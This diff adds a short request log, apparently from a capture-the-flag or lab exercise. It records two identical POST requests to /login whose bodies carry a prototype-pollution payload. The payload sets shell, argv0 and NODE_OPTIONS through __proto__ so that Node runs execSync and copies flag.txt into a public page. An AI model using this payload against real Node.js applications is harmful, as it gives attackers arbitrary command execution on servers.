@@ -1,0 +1,8 @@
+Time: 2023-12-07T15:18:16.802Z 
+ Request: "title = \"userData\" \n [__proto__] shell = \"/proc/self/exe\" \n argv0 = \"require(\\\"child_process\\\").execSync(\\\"cat flag.txt > public/pages/empty.html\\\")//\" \n  NODE_OPTIONS = \"--require /proc/self/cmdline\" \n [user] \n name = \"admin\" \n password = \"dksjhf2798y8372ghkjfgsd8jbfsig7g2gkfjsh\"" 
+ URL: /login 
+ IP: ::1 
+Time: 2023-12-07T15:23:58.152Z 
+ Request: "title = \"userData\" \n [__proto__] shell = \"/proc/self/exe\" \n argv0 = \"require(\\\"child_process\\\").execSync(\\\"cat flag.txt > public/pages/empty.html\\\")//\" \n  NODE_OPTIONS = \"--require /proc/self/cmdline\" \n [user] \n name = \"admin\" \n password = \"dksjhf2798y8372ghkjfgsd8jbfsig7g2gkfjsh\"" 
+ URL: /login 
+ IP: ::1 
